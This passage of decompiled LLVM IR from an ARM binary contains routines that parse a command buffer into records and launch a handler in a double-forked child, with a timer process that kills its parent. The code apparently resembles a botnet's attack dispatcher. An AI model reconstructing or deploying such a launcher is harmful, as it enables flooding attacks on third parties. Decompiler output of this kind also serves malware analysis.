  %v2_acf4 = inttoptr i32 %v1_acf4 to i8*
  %v3_acf4 = load i8, i8* %v2_acf4, align 1
  %v4_acf4 = zext i8 %v3_acf4 to i32
  %v9_acf8 = icmp eq i32 %v4_acf4, %v1_ace8
  br i1 %v9_acf8, label %dec_label_pc_ad34, label %dec_label_pc_ad1c.preheader

dec_label_pc_ad1c.preheader:                      ; preds = %dec_label_pc_acf4
  br label %dec_label_pc_ad1c

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad1c
  %v1_ad0c = add i32 %v0_ad14.in, 12
  %v2_ad0c = inttoptr i32 %v1_ad0c to i8*
  %v3_ad0c = load i8, i8* %v2_ad0c, align 1
  %v4_ad0c = zext i8 %v3_ad0c to i32
  %v9_ad10 = icmp eq i32 %v4_ad0c, %v1_ace8
  br i1 %v9_ad10, label %dec_label_pc_ad34, label %dec_label_pc_ad1c

dec_label_pc_ad1c:                                ; preds = %dec_label_pc_ad1c.preheader, %dec_label_pc_ad0c
  %v0_ad14.in = phi i32 [ %v0_acf4, %dec_label_pc_ad1c.preheader ], [ %v0_ad14, %dec_label_pc_ad0c ]
  %v0_ad1c = phi i32 [ 0, %dec_label_pc_ad1c.preheader ], [ %v1_ad1c, %dec_label_pc_ad0c ]
  %v0_ad14 = add i32 %v0_ad14.in, 8
  %v1_ad1c = add i32 %v0_ad1c, 1
  store i32 %v1_ad1c, i32* @lr, align 4
  %v9_ad20 = icmp eq i32 %v1_ad1c, %v1_acdc
  store i32 %v0_ad14, i32* %r1.global-to-local, align 4
  br i1 %v9_ad20, label %dec_label_pc_ad2c, label %dec_label_pc_ad0c

dec_label_pc_ad2c:                                ; preds = %dec_label_pc_ad1c, %dec_label_pc_acdc
  ret i32 %arg4

dec_label_pc_ad34:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_acf4
  %v0_ad34 = phi i32 [ %v0_acf4, %dec_label_pc_acf4 ], [ %v0_ad14, %dec_label_pc_ad0c ]
  %v1_ad34 = inttoptr i32 %v0_ad34 to i32*
  %v2_ad34 = load i32, i32* %v1_ad34, align 4
  ret i32 %v2_ad34

; uselistorder directives
  uselistorder i32 %v1_ad1c, { 1, 2, 0 }
  uselistorder i32 %v0_ad14, { 1, 0, 2 }
  uselistorder i32 %v0_ad14.in, { 1, 0 }
  uselistorder i32 %v0_acf4, { 1, 0, 2 }
  uselistorder i32 %v1_ace8, { 1, 0 }
  uselistorder i32 %v1_acdc, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ad1c, { 1, 0 }
}

define i32 @function_ad40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_ad40:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ad40 = load i32, i32* @r4, align 4
  store i32 %v3_ad40, i32* %stack_var_-32, align 4
  %v6_ad40 = load i32, i32* @r5, align 4
  %v9_ad40 = load i32, i32* @r6, align 4
  %v12_ad40 = load i32, i32* @r7, align 4
  %v18_ad40 = load i32, i32* @sb, align 4
  %v0_ad44 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_ad44, i32* @sb, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v1_ad4c = urem i32 %arg2, 256
  store i32 %v1_ad4c, i32* %r7.global-to-local, align 4
  %v0_ad58 = call i32 @fork()
  %v7_ad5c = icmp eq i32 %v0_ad58, -1
  %. = zext i1 %v7_ad5c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_ad58, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_ad40
  store i32 1, i32* %r5.global-to-local, align 4
  br label %bb25

bb24:                                             ; preds = %dec_label_pc_ad40
  store i32 %., i32* %r5.global-to-local, align 4
  %v2_ad74 = icmp eq i1 %v7_ad5c, false
  br i1 %v2_ad74, label %bb26, label %bb25

bb25:                                             ; preds = %.thread2, %bb24
  %v3_ad78 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_ad78, i32* %r4.global-to-local, align 4
  store i32 %v6_ad40, i32* %r5.global-to-local, align 4
  store i32 %v9_ad40, i32* %r6.global-to-local, align 4
  store i32 %v12_ad40, i32* %r7.global-to-local, align 4
  store i32 %v18_ad40, i32* @sb, align 4
  ret i32 %v0_ad58

bb26:                                             ; preds = %bb24
  %v0_ad7c = call i32 @fork()
  %v7_ad80 = icmp eq i32 %v0_ad7c, -1
  store i32 %v0_ad7c, i32* %r4.global-to-local, align 4
  br i1 %v7_ad80, label %dec_label_pc_adb0, label %dec_label_pc_ad8c

dec_label_pc_ad8c:                                ; preds = %bb26
  %v2_ad8c = icmp eq i32 %v0_ad7c, 0
  br i1 %v2_ad8c, label %dec_label_pc_ad94, label %dec_label_pc_adb8

dec_label_pc_ad94:                                ; preds = %dec_label_pc_ad8c
  %v0_ad94 = load i32, i32* %r6.global-to-local, align 4
  %v1_ad98 = call i32 @sleep(i32 %v0_ad94)
  %v0_ad9c = call i32 @getppid()
  %v2_ada4 = call i32 @kill(i32 %v0_ad9c, i32 9)
  %v0_ada8 = load i32, i32* %r4.global-to-local, align 4
  call void @exit(i32 %v0_ada8)
  unreachable

dec_label_pc_adb0:                                ; preds = %bb26
  %v0_adb0 = load i32, i32* %r5.global-to-local, align 4
  call void @exit(i32 %v0_adb0)
  unreachable

dec_label_pc_adb8:                                ; preds = %dec_label_pc_ad8c
  store i32 ptrtoint (i8** @global_var_1ccd0.109 to i32), i32* %r3.global-to-local, align 4
  %v2_adbc = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_adbc = zext i8 %v2_adbc to i32
  %v2_adc0 = icmp eq i8 %v2_adbc, 0
  br i1 %v2_adc0, label %dec_label_pc_ae04, label %dec_label_pc_adc8

dec_label_pc_adc8:                                ; preds = %dec_label_pc_adb8
  store i32 ptrtoint (i32* @global_var_1ccd4.111 to i32), i32* %r3.global-to-local, align 4
  %v2_adcc = load i32, i32* @global_var_1ccd4.111, align 4
  %v1_add0 = inttoptr i32 %v2_adcc to i32*
  %v2_add0 = load i32, i32* %v1_add0, align 4
  %v1_add4 = add i32 %v2_add0, 4
  %v2_add4 = inttoptr i32 %v1_add4 to i8*
  %v3_add4 = load i8, i8* %v2_add4, align 1
  %v4_add4 = zext i8 %v3_add4 to i32
  store i32 %v4_add4, i32* %r3.global-to-local, align 4
  %v1_add8 = load i32, i32* %r7.global-to-local, align 4
  %v9_add8 = icmp eq i32 %v4_add4, %v1_add8
  br i1 %v9_add8, label %dec_label_pc_ae0c, label %dec_label_pc_adf8.preheader

dec_label_pc_adf8.preheader:                      ; preds = %dec_label_pc_adc8
  %v1_addc = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_adf8

dec_label_pc_ade8:                                ; preds = %dec_label_pc_adf8
  %v4_ade8 = mul i32 %v1_adf8, 4
  %v5_ade8 = add i32 %v4_ade8, %v2_adcc
  %v6_ade8 = inttoptr i32 %v5_ade8 to i32*
  %v7_ade8 = load i32, i32* %v6_ade8, align 4
  %v1_adec = add i32 %v7_ade8, 4
  %v2_adec = inttoptr i32 %v1_adec to i8*
  %v3_adec = load i8, i8* %v2_adec, align 1
  %v4_adec = zext i8 %v3_adec to i32
  store i32 %v4_adec, i32* %r3.global-to-local, align 4
  %v9_adf0 = icmp eq i32 %v4_adec, %v1_add8
  br i1 %v9_adf0, label %dec_label_pc_ae0c, label %dec_label_pc_adf8

dec_label_pc_adf8:                                ; preds = %dec_label_pc_adf8.preheader, %dec_label_pc_ade8
  %v0_adf8 = phi i32 [ %v1_addc, %dec_label_pc_adf8.preheader ], [ %v1_adf8, %dec_label_pc_ade8 ]
  %v1_adf8 = add i32 %v0_adf8, 1
  %v9_adfc = icmp eq i32 %v1_adf8, %v3_adbc
  br i1 %v9_adfc, label %dec_label_pc_ae04, label %dec_label_pc_ade8

dec_label_pc_ae04:                                ; preds = %dec_label_pc_adf8, %dec_label_pc_adb8, %dec_label_pc_ae0c
  call void @exit(i32 0)
  unreachable

dec_label_pc_ae0c:                                ; preds = %dec_label_pc_ade8, %dec_label_pc_adc8
  %v0_ae20 = phi i32 [ %v2_add0, %dec_label_pc_adc8 ], [ %v7_ade8, %dec_label_pc_ade8 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_ae20 = inttoptr i32 %v0_ae20 to i32*
  %v2_ae20 = load i32, i32* %v1_ae20, align 4
  call void @__pseudo_branch(i32 %v2_ae20)
  br label %dec_label_pc_ae04

; uselistorder directives
  uselistorder i32 %v1_adf8, { 2, 0, 1 }
  uselistorder i32 %v0_ad7c, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_ad5c, { 1, 0 }
  uselistorder i32 %v0_ad58, { 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder label %dec_label_pc_ae04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_adf8, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
}

define i32 @function_ae30(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ae30:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v9_ae30 = load i32, i32* @r6, align 4
  %v12_ae30 = load i32, i32* @r7, align 4
  %v18_ae30 = load i32, i32* @sb, align 4
  %v21_ae30 = load i32, i32* @sl, align 4
  %v27_ae30 = load i32, i32* @lr, align 4
  %v7_ae34 = icmp eq i32 %arg2, 3
  store i1 %v7_ae34, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r5, align 4
  %v0_ae40 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ae40, i32* @r4, align 4
  %tmp33 = icmp ult i32 %arg2, 4
  br i1 %tmp33, label %dec_label_pc_ae54, label %dec_label_pc_ae48

dec_label_pc_ae48:                                ; preds = %dec_label_pc_ae30
  %v7_ae48 = icmp eq i32 %arg2, 4
  store i1 %v7_ae48, i1* %cpsr_z.global-to-local, align 1
  %v1_ae4c = inttoptr i32 %v0_ae40 to i32*
  %v2_ae4c = load i32, i32* %v1_ae4c, align 4
  store i32 %v2_ae4c, i32* @sl, align 4
  br i1 %v7_ae48, label %dec_label_pc_ae54, label %dec_label_pc_ae5c

dec_label_pc_ae54:                                ; preds = %dec_label_pc_ae78, %.dec_label_pc_ae54_crit_edge, %dec_label_pc_ae48, %dec_label_pc_ae6c, %dec_label_pc_ae5c, %dec_label_pc_ae30
  %v29_ae58 = phi i32 [ %v29_ae58.pre, %.dec_label_pc_ae54_crit_edge ], [ %v0_ae40, %dec_label_pc_ae78 ], [ %v0_ae40, %dec_label_pc_ae48 ], [ %v0_ae40, %dec_label_pc_ae6c ], [ %v0_ae40, %dec_label_pc_ae5c ], [ %v0_ae40, %dec_label_pc_ae30 ]
  store i32 %v9_ae30, i32* @r6, align 4
  store i32 %v12_ae30, i32* @r7, align 4
  store i32 %v18_ae30, i32* @sb, align 4
  store i32 %v21_ae30, i32* @sl, align 4
  ret i32 %v29_ae58

dec_label_pc_ae5c:                                ; preds = %dec_label_pc_ae48
  %v7_ae5c = icmp eq i32 %arg2, 5
  store i1 %v7_ae5c, i1* %cpsr_z.global-to-local, align 1
  %v1_ae60 = add i32 %v0_ae40, 4
  %v2_ae60 = inttoptr i32 %v1_ae60 to i8*
  %v3_ae60 = load i8, i8* %v2_ae60, align 1
  %v4_ae60 = zext i8 %v3_ae60 to i32
  store i32 %v4_ae60, i32* %r1.global-to-local, align 4
  br i1 %v7_ae5c, label %dec_label_pc_ae54, label %dec_label_pc_ae6c

dec_label_pc_ae6c:                                ; preds = %dec_label_pc_ae5c
  %v1_ae6c = add i32 %v0_ae40, 5
  %v2_ae6c = inttoptr i32 %v1_ae6c to i8*
  %v3_ae6c = load i8, i8* %v2_ae6c, align 1
  %v4_ae6c = zext i8 %v3_ae6c to i32
  store i32 %v4_ae6c, i32* @r7, align 4
  %v2_ae70 = icmp eq i8 %v3_ae6c, 0
  store i1 %v2_ae70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ae70, label %dec_label_pc_ae54, label %dec_label_pc_ae78

dec_label_pc_ae78:                                ; preds = %dec_label_pc_ae6c
  %v3_ae78 = mul nuw nsw i32 %v4_ae6c, 4
  store i32 %v3_ae78, i32* @sb, align 4
  %v1_ae7c = add i32 %arg2, -6
  store i32 %v1_ae7c, i32* @r6, align 4
  %v2_ae80 = mul nuw nsw i32 %v4_ae6c, 5
  store i32 %v2_ae80, i32* @r8, align 4
  %v3_ae84 = icmp ult i32 %v1_ae7c, %v2_ae80
  %v9_ae84 = icmp eq i32 %v1_ae7c, %v2_ae80
  store i1 %v9_ae84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ae84, label %dec_label_pc_ae54, label %dec_label_pc_ae8c

dec_label_pc_ae8c:                                ; preds = %dec_label_pc_ae78
  store i32 %v4_ae6c, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  %v2_ae94 = call i32* @calloc(i32 %v4_ae6c, i32 24)
  %v4_ae94 = ptrtoint i32* %v2_ae94 to i32
  store i32 %v4_ae94, i32* %r0.global-to-local, align 4
  %v0_ae98 = load i32, i32* @r7, align 4
  %v2_ae98 = icmp eq i32 %v0_ae98, 0
  store i1 %v2_ae98, i1* %cpsr_z.global-to-local, align 1
  %v0_aea0 = load i32, i32* @r4, align 4
  %v1_aea0 = add i32 %v0_aea0, 6
  store i32 %v1_aea0, i32* %fp.global-to-local, align 4
  %tmp27 = icmp slt i32 %v0_ae98, 1
  br i1 %tmp27, label %dec_label_pc_aef8thread-pre-split, label %dec_label_pc_aea8

dec_label_pc_aea8:                                ; preds = %dec_label_pc_ae8c
  store i32 %v4_ae94, i32* %r1.global-to-local, align 4
  %v1_aeac = load i32, i32* @r8, align 4
  %v2_aeac = add i32 %v1_aeac, %v0_aea0
  store i32 %v2_aeac, i32* %ip.global-to-local, align 4
  store i32 %v0_aea0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_aebc

dec_label_pc_aebc:                                ; preds = %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge, %dec_label_pc_aea8
  %v2_aecc = phi i32 [ %v1_aee0, %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge ], [ %v4_ae94, %dec_label_pc_aea8 ]
  %v0_aec8 = phi i32 [ %v0_aec8.pre, %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge ], [ %v2_aeac, %dec_label_pc_aea8 ]
  %v0_aec4 = phi i32 [ %v0_aebc.pre, %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge ], [ %v0_aea0, %dec_label_pc_aea8 ]
  %v1_aebc = add i32 %v0_aec4, 10
  %v2_aebc = inttoptr i32 %v1_aebc to i8*
  %v3_aebc = load i8, i8* %v2_aebc, align 1
  %v1_aec0 = add i32 %v0_aec4, 6
  %v2_aec0 = inttoptr i32 %v1_aec0 to i32*
  %v3_aec0 = load i32, i32* %v2_aec0, align 4
  store i32 %v3_aec0, i32* %r2.global-to-local, align 4
  %v1_aec4 = add i32 %v0_aec4, 5
  store i32 %v1_aec4, i32* %r0.global-to-local, align 4
  %v9_aec8 = icmp eq i32 %v0_aec8, %v1_aec4
  store i1 %v9_aec8, i1* %cpsr_z.global-to-local, align 1
  %v3_aecc = add i32 %v2_aecc, 20
  %v4_aecc = inttoptr i32 %v3_aecc to i8*
  store i8 %v3_aebc, i8* %v4_aecc, align 1
  %v0_aed0 = load i32, i32* %r2.global-to-local, align 4
  %v1_aed0 = load i32, i32* %r1.global-to-local, align 4
  %v2_aed0 = add i32 %v1_aed0, 4
  %v3_aed0 = inttoptr i32 %v2_aed0 to i32*
  store i32 %v0_aed0, i32* %v3_aed0, align 4
  %v0_aed4 = load i32, i32* %r2.global-to-local, align 4
  %v1_aed4 = load i32, i32* %r1.global-to-local, align 4
  %v2_aed4 = add i32 %v1_aed4, 16
  %v3_aed4 = inttoptr i32 %v2_aed4 to i32*
  store i32 %v0_aed4, i32* %v3_aed4, align 4
  %v0_aed8 = load i32, i32* @r4, align 4
  %v1_aed8 = trunc i32 %v0_aed8 to i8
  %v2_aed8 = load i32, i32* %r1.global-to-local, align 4
  %v3_aed8 = inttoptr i32 %v2_aed8 to i8*
  store i8 %v1_aed8, i8* %v3_aed8, align 1
  %v0_aedc = load i32, i32* %lr.global-to-local, align 4
  %v1_aedc = trunc i32 %v0_aedc to i8
  %v2_aedc = load i32, i32* %r1.global-to-local, align 4
  %v3_aedc = add i32 %v2_aedc, 1
  %v4_aedc = inttoptr i32 %v3_aedc to i8*
  store i8 %v1_aedc, i8* %v4_aedc, align 1
  %v0_aee0 = load i32, i32* %r1.global-to-local, align 4
  %v1_aee0 = add i32 %v0_aee0, 24
  store i32 %v1_aee0, i32* %r1.global-to-local, align 4
  %v0_aee4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aee4, label %dec_label_pc_aee8, label %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge

dec_label_pc_aebc.dec_label_pc_aebc_crit_edge:    ; preds = %dec_label_pc_aebc
  %v0_aebc.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_aec8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_aebc

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aebc
  %v0_aee8 = load i32, i32* @sb, align 4
  %v1_aee8 = load i32, i32* @r7, align 4
  %v1_aeec = load i32, i32* @r5, align 4
  %sum = add i32 %v1_aee8, %v0_aee8
  %v2_aeec = sub i32 %v1_aeec, %sum
  %v0_aef0 = load i32, i32* %r0.global-to-local, align 4
  %v1_aef0 = add i32 %v0_aef0, 6
  store i32 %v1_aef0, i32* %fp.global-to-local, align 4
  %v1_aef4 = add i32 %v2_aeec, -6
  store i32 %v1_aef4, i32* @r6, align 4
  br label %dec_label_pc_aef8

dec_label_pc_aef8thread-pre-split:                ; preds = %dec_label_pc_ae8c
  %v0_aef8.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_aef8

dec_label_pc_aef8:                                ; preds = %dec_label_pc_aef8thread-pre-split, %dec_label_pc_aee8
  %v0_af04 = phi i32 [ %v1_aea0, %dec_label_pc_aef8thread-pre-split ], [ %v1_aef0, %dec_label_pc_aee8 ]
  %v1_aefc = phi i32 [ %v0_aef8.pr, %dec_label_pc_aef8thread-pre-split ], [ %v1_aef4, %dec_label_pc_aee8 ]
  %v2_aef8 = icmp eq i32 %v1_aefc, 0
  store i1 %v2_aef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aef8, label %dec_label_pc_b030, label %dec_label_pc_af04

dec_label_pc_af04:                                ; preds = %dec_label_pc_aef8
  %v1_af04 = inttoptr i32 %v0_af04 to i8*
  %v2_af04 = load i8, i8* %v1_af04, align 1
  %v3_af04 = zext i8 %v2_af04 to i32
  store i32 %v3_af04, i32* @sb, align 4
  %v2_af08 = icmp eq i8 %v2_af04, 0
  store i1 %v2_af08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af08, label %dec_label_pc_afe8, label %dec_label_pc_af18

dec_label_pc_af18:                                ; preds = %dec_label_pc_af04
  store i32 %v3_af04, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_af20 = call i32* @calloc(i32 %v3_af04, i32 8)
  %v4_af20 = ptrtoint i32* %v2_af20 to i32
  store i32 %v4_af20, i32* %r0.global-to-local, align 4
  %v0_af24 = load i32, i32* @sb, align 4
  %v2_af24 = icmp eq i32 %v0_af24, 0
  store i1 %v2_af24, i1* %cpsr_z.global-to-local, align 1
  %tmp28 = icmp slt i32 %v0_af24, 1
  br i1 %tmp28, label %dec_label_pc_afe8, label %dec_label_pc_af34

dec_label_pc_af34:                                ; preds = %dec_label_pc_af18
  %v0_af34 = load i32, i32* @r6, align 4
  %v1_af34 = add i32 %v0_af34, -1
  store i32 %v1_af34, i32* %r2.global-to-local, align 4
  %v7_af34 = icmp eq i32 %v0_af34, 1
  store i1 %v7_af34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_af34, label %dec_label_pc_b030, label %dec_label_pc_af3c

dec_label_pc_af3c:                                ; preds = %dec_label_pc_af34
  %v0_af3c = load i32, i32* %fp.global-to-local, align 4
  %v1_af3c = add i32 %v0_af3c, 1
  %v2_af3c = inttoptr i32 %v1_af3c to i8*
  %v3_af3c = load i8, i8* %v2_af3c, align 1
  %v1_af40 = add i32 %v0_af34, -2
  store i32 %v1_af40, i32* %r2.global-to-local, align 4
  %v7_af40 = icmp eq i32 %v1_af34, 1
  store i1 %v7_af40, i1* %cpsr_z.global-to-local, align 1
  %v3_af44 = add i32 %v4_af20, 4
  %v4_af44 = inttoptr i32 %v3_af44 to i8*
  store i8 %v3_af3c, i8* %v4_af44, align 1
  %v0_af48 = load i32, i32* %fp.global-to-local, align 4
  %v1_af48 = add i32 %v0_af48, 1
  store i32 %v1_af48, i32* %r0.global-to-local, align 4
  %v0_af4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_af4c, label %dec_label_pc_b030, label %dec_label_pc_af50

dec_label_pc_af50:                                ; preds = %dec_label_pc_af3c
  %v1_af50 = add i32 %v0_af48, 2
  %v2_af50 = inttoptr i32 %v1_af50 to i8*
  %v3_af50 = load i8, i8* %v2_af50, align 1
  %v4_af50 = zext i8 %v3_af50 to i32
  store i32 %v4_af50, i32* @r4, align 4
  %v0_af54 = load i32, i32* %r2.global-to-local, align 4
  %v1_af54 = add i32 %v0_af54, -1
  store i32 %v1_af54, i32* @r8, align 4
  %v9_af58 = icmp eq i32 %v1_af54, %v4_af50
  store i1 %v9_af58, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_af50, i32* %r0.global-to-local, align 4
  %v5_af60 = icmp slt i32 %v1_af54, %v4_af50
  br i1 %v5_af60, label %dec_label_pc_b030, label %dec_label_pc_af64

dec_label_pc_af64:                                ; preds = %dec_label_pc_af50
  store i32 %v4_af20, i32* @r5, align 4
  %v1_af6c = add i32 %v4_af20, 8
  %v1_af70 = add i32 %v0_af48, 3
  store i32 %v1_af70, i32* @r6, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_afb4

dec_label_pc_af80:                                ; preds = %dec_label_pc_afb4
  %v0_af80 = load i32, i32* @r8, align 4
  %v1_af80 = load i32, i32* @r4, align 4
  %v2_af80 = sub i32 %v0_af80, %v1_af80
  store i32 %v2_af80, i32* %r2.global-to-local, align 4
  %v9_af80 = icmp eq i32 %v0_af80, %v1_af80
  store i1 %v9_af80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_af80, label %dec_label_pc_b030, label %dec_label_pc_af88

dec_label_pc_af88:                                ; preds = %dec_label_pc_af80
  %v1_af88 = load i32, i32* @r6, align 4
  %v2_af88 = add i32 %v1_af88, %v1_af80
  %v3_af88 = inttoptr i32 %v2_af88 to i8*
  %v4_af88 = load i8, i8* %v3_af88, align 1
  store i32 %v2_af88, i32* %r0.global-to-local, align 4
  %v1_af90 = add i32 %v2_af80, -1
  store i32 %v1_af90, i32* %r2.global-to-local, align 4
  %v7_af90 = icmp eq i32 %v2_af80, 1
  store i1 %v7_af90, i1* %cpsr_z.global-to-local, align 1
  %v3_af94 = add i32 %v2_af94, 4
  %v4_af94 = inttoptr i32 %v3_af94 to i8*
  store i8 %v4_af88, i8* %v4_af94, align 1
  %v0_af98 = load i32, i32* %r0.global-to-local, align 4
  %v0_af9c = load i32, i32* %r2.global-to-local, align 4
  %v1_af9c = add i32 %v0_af9c, -1
  store i32 %v1_af9c, i32* @r8, align 4
  %v1_afa0 = add i32 %v0_af98, 2
  store i32 %v1_afa0, i32* @r6, align 4
  %v0_afa4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_afa4, label %dec_label_pc_b030, label %dec_label_pc_afa8

dec_label_pc_afa8:                                ; preds = %dec_label_pc_af88
  %v1_af98 = add i32 %v0_af98, 1
  %v2_afa8 = inttoptr i32 %v1_af98 to i8*
  %v3_afa8 = load i8, i8* %v2_afa8, align 1
  %v4_afa8 = zext i8 %v3_afa8 to i32
  store i32 %v4_afa8, i32* @r4, align 4
  %v2_afac = sub i32 %v1_af9c, %v4_afa8
  %tmp30 = sub i32 0, %v2_afac
  %v6_afac = and i32 %v1_af9c, %tmp30
  %v7_afac = icmp slt i32 %v6_afac, 0
  %v8_afac = icmp slt i32 %v2_afac, 0
  %v9_afac = icmp eq i32 %v1_af9c, %v4_afa8
  store i1 %v9_afac, i1* %cpsr_z.global-to-local, align 1
  %v2_afb0 = xor i1 %v8_afac, %v7_afac
  br i1 %v2_afb0, label %dec_label_pc_b030, label %dec_label_pc_afb4

dec_label_pc_afb4:                                ; preds = %dec_label_pc_afa8, %dec_label_pc_af64
  %v0_afb8 = phi i32 [ %v4_af50, %dec_label_pc_af64 ], [ %v4_afa8, %dec_label_pc_afa8 ]
  %v2_af94 = phi i32 [ %v1_af6c, %dec_label_pc_af64 ], [ %v1_afd8, %dec_label_pc_afa8 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_afb8 = add nuw nsw i32 %v0_afb8, 1
  store i32 %v1_afb8, i32* %r0.global-to-local, align 4
  %v2_afbc = call i32* @calloc(i32 %v1_afb8, i32 1)
  %v3_afbc = ptrtoint i32* %v2_afbc to i32
  store i32 %v3_afbc, i32* %r0.global-to-local, align 4
  %v0_afc0 = load i32, i32* @r6, align 4
  store i32 %v0_afc0, i32* %r1.global-to-local, align 4
  %v1_afc4 = load i32, i32* @r5, align 4
  %v2_afc4 = inttoptr i32 %v1_afc4 to i32*
  store i32 %v3_afbc, i32* %v2_afc4, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  store i32 %v0_afc8, i32* %r2.global-to-local, align 4
  %v3_afcc = call i32 @function_13a18(i32 %v3_afbc, i32 %v0_afc0, i32 %v0_afc8)
  store i32 %v3_afcc, i32* %r0.global-to-local, align 4
  store i32 %v2_af94, i32* @r5, align 4
  %v0_afd4 = load i32, i32* %fp.global-to-local, align 4
  %v1_afd4 = add i32 %v0_afd4, 1
  store i32 %v1_afd4, i32* %fp.global-to-local, align 4
  %v1_afd8 = add i32 %v2_af94, 8
  store i32 %v1_afd8, i32* %ip.global-to-local, align 4
  %v1_afdc = load i32, i32* @sb, align 4
  %v9_afdc = icmp eq i32 %v1_afd4, %v1_afdc
  store i1 %v9_afdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_afdc, label %dec_label_pc_afe8, label %dec_label_pc_af80

dec_label_pc_afe8:                                ; preds = %dec_label_pc_afb4, %dec_label_pc_af18, %dec_label_pc_af04
  %stack_var_-48.1 = phi i32 [ %v3_af04, %dec_label_pc_af04 ], [ %v0_af24, %dec_label_pc_af18 ], [ %v0_af24, %dec_label_pc_afb4 ]
  %stack_var_-52.2 = phi i32 [ %v3_af04, %dec_label_pc_af04 ], [ %v4_af20, %dec_label_pc_af18 ], [ %v4_af20, %dec_label_pc_afb4 ]
  %v0_afe8 = call i32* @__errno_location()
  %v0_afec = load i32, i32* @sl, align 4
  store i32 %stack_var_-48.1, i32* %ip.global-to-local, align 4
  %v3_aff8 = mul i32 %v0_afec, 16777216
  %v1_afec = mul i32 %v0_afec, 256
  %v4_affc = and i32 %v1_afec, 16711680
  %v5_affc = or i32 %v4_affc, %v3_aff8
  store i32 %v5_affc, i32* %r1.global-to-local, align 4
  %v1_aff4 = udiv i32 %v0_afec, 256
  %v3_b000 = and i32 %v1_aff4, 65280
  store i32 %v3_b000, i32* %r2.global-to-local, align 4
  store i32 0, i32* %v0_afe8, align 4
  %v1_b00c = load i32, i32* @sl, align 4
  %v4_b00c = udiv i32 %v1_b00c, 16777216
  %v5_b00c = or i32 %v4_b00c, %v3_b000
  %v0_b010 = load i32, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-52.2, i32* %ip.global-to-local, align 4
  %v1_b018 = load i32, i32* %r1.global-to-local, align 4
  %v2_b018 = or i32 %v5_b00c, %v1_b018
  store i32 %v2_b018, i32* %r0.global-to-local, align 4
  store i32 %v4_ae60, i32* %r1.global-to-local, align 4
  %v0_b024 = load i32, i32* @r7, align 4
  store i32 %v0_b024, i32* %r2.global-to-local, align 4
  %v6_b02c = trunc i32 %v0_b010 to i8
  %v7_b02c = call i32 @function_ad40(i32 %v2_b018, i32 %v4_ae60, i32 %v0_b024, i32 %v4_ae94, i8 %v6_b02c, i32 %stack_var_-52.2)
  store i32 %v7_b02c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b030

